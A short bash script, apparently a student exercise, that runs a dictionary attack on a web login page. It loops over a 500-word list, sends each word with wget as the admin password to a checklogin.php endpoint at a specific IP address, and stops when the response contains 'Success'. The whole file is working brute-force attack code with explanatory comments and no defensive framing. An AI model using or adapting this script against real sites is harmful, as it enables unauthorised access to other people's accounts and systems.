#!/bin/bash

for textword in $(cat dictionary_500_words) #create a loop,to loop around the dictionary of word. Create a varible text word to store the value on each loop.
	do
	    
		wordstring="http://18.202.140.65/checklogin.php?myusername=admin&mypassword="$textword"&Submit=Login" # Create a string varible wordstring to store the url in. I make the password equal to the varible textword on each round of the loop.
			wget -O  result $wordstring # use wget to get the contents of the webpage and store it in a veriable called result.
				if [ $(grep -c -i Success /home/clausyd/result) -eq 1 ] # Here to a test to see if the word success is in the result of the wget command if its there is will equal 1 if not it will equal 0.
					then
						echo $textword # The print the word to the screen.
                                                exit
				fi
	done
